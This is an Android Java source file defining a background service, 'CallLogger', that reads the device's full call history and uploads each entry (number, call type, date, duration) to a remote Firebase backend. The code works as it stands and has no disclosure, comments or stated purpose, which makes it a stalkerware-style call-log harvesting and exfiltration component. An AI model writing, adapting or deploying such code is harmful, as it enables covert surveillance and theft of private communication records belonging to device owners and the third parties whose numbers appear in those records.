
package com.example.app;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;

public class CallLogger extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                    String log = String.format("%s | Type: %s | Date: %s | Duration: %s",
                            number, type, date, duration);
                    FirebaseClient.pushLog(getApplicationContext(), "calls", log);
                }
                cursor.close();
            }
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
